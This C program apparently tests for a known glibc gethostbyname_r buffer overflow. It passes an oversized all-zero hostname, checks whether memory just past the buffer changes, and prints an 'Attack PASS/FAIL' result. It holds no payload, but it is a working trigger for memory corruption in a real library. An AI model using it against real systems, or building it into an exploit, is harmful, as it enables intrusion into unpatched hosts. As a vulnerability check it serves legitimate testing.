#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define GUARD_VAL 0xdeadbeef

int main(void) {
  char buffer[1024] = {"buffer"};
  int  guard = GUARD_VAL;
  int  guard_res = GUARD_VAL;
  int  target_before_attack = 0x00;
  int  target_after_attack  = 0x00;
  int  *ptarget;

  struct hostent resbuf;
  struct hostent *result;
  int herrno;
  int retval;
  size_t len;
  char name[sizeof(buffer)];

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
  len = sizeof(buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
  memset(name, '0', len);
  name[len] = '\0';

  ptarget = (int *)(&buffer[1024]);
  target_before_attack = *ptarget;
  retval = gethostbyname_r(name, &resbuf, buffer, sizeof(buffer), &result, &herrno);
  target_after_attack = *ptarget;
  printf("&buffer[1024]: 0x%08x\n", &buffer[1024]);
  printf("&guard       : 0x%08x\n", &ptarget);
  printf("target(before attack)=0x%08x target(after attack)=0x%08x\n", target_before_attack, target_after_attack);

  if (target_after_attack != target_before_attack) {
	  puts("RESULT:Attack PASS");
	  exit(EXIT_SUCCESS);
  }
  if (retval == ERANGE) {
	puts("RESULT:Attack FAIL");
	exit(EXIT_SUCCESS);
  }

  puts("RESULT:Attack UNKNOWN");
  exit(EXIT_FAILURE);
}
